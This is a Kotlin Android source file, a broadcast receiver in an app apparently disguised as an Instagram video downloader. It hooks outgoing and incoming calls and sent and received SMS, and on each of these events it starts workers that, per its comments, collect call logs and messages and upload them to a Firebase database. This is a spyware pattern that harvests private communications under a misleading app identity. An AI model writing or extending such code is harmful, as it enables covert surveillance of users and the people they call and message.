package com.example.instagramvideodownloader.broadcast_receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.telephony.TelephonyManager
import android.widget.Toast
import com.example.instagramvideodownloader.home.HomeActivity

class EventListenerReceiver : BroadcastReceiver() {
    private var eventListener: OnEventListener? = null

    fun setEventListener(eventListener: OnEventListener?) {
        this.eventListener = eventListener
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.intent.action.NEW_OUTGOING_CALL") {
            // Call is made, fetch call logs and upload to Firebase Realtime Database
            intent.action.let {
                eventListener?.onNewEvent(it!!)
            }
            (context as? HomeActivity)?.startCallLogsWorker()
            Toast.makeText(context, "Call initiated", Toast.LENGTH_SHORT).show()
        }

        // For detecting incoming calls, use TelephonyManager.ACTION_PHONE_STATE_CHANGED
        if (intent.action == "android.intent.action.PHONE_STATE") {
            val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
            if (state == TelephonyManager.EXTRA_STATE_RINGING) {
                intent.action.let {
                    eventListener?.onNewEvent(it!!)
                }
                // Handle the incoming call event here
                Toast.makeText(context, "Call received", Toast.LENGTH_SHORT).show()
                // Implement your logic for handling the incoming call event
                // You can fetch call logs and upload to Firebase Realtime Database here
                (context as? HomeActivity)?.startCallLogsWorker()
            }
        }

        if (intent.action == "SMS_SENT") {
            // Check for custom permission before proceeding
            if (context.checkCallingOrSelfPermission("com.example.instagramvideodownloader.permission.SMS_SENT")
                == PackageManager.PERMISSION_GRANTED
            ) {
                intent.action.let {
                    eventListener?.onNewEvent(it!!)
                }
                Toast.makeText(context, "SMS Sent", Toast.LENGTH_SHORT).show()
                // SMS sent successfully
                (context as? HomeActivity)?.startMessagesWorker()
            } else {
                Toast.makeText(context, "No permissions provided", Toast.LENGTH_SHORT).show()
                // Handle lack of permission
            }
        }

        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            // Handle the SMS received event here
            intent.action.let {
                eventListener?.onNewEvent(it!!)
            }
            Toast.makeText(context, "SMS Received", Toast.LENGTH_SHORT).show()
            // Implement your logic for handling the SMS received event, e.g., startMessagesWorker()
            (context as? HomeActivity)?.startMessagesWorker()
        }
    }

}

interface OnEventListener {
    fun onNewEvent(event: String)
}